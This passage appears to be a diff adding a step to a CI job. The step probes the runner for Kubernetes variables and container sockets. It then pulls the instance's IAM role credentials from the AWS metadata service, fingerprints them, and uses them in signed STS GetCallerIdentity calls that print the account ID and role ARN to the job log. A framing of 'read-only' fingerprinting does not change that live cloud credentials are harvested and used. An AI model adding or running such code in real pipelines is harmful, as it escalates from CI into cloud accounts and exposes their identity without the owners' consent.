+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-a5-4-01 nonce=$NONCE ts=$(ts)"
+          exit 0
